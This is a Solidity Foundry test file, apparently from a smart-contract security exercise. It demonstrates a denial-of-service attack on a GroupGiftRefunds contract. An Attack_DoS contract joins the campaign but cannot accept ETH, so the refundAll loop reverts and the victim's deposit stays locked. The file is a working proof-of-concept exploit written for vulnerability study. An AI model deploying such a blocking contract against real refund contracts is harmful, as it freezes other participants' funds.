
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";           
import "../src/09_GroupGiftRefunds.sol";

contract Attack_DoS {
    function start_attack (GroupGiftRefunds _refund) external payable{
        _refund.join{value:msg.value}();
    }
}


contract GiftRefundsTest is Test{
    Attack_DoS empty;
    GroupGiftRefunds refund;
    address victim;
    address gift_rec;

    function setUp() public{
        gift_rec = makeAddr("beneficiary");
        refund = new GroupGiftRefunds(1 ether ,gift_rec);
        empty = new Attack_DoS();
        victim = makeAddr("victim");
        vm.deal (address(empty),1 ether);
        empty.start_attack{value:1 ether}(refund);
        vm.deal (address(victim),1 ether );
        vm.prank(victim);
        refund.join{value:1 ether}();
        refund.cancelCampaign();
    }

    function testit() public {
        uint256 balanceAddress =address(refund).balance;
        vm.expectRevert("Refund failed");
        refund.refundAll();
        emit log_named_uint("ETH victim before: " , balanceAddress);
        emit log_named_uint("ETH victim after" , address(refund).balance);
        assertGt(address(refund).balance,0);
    }

}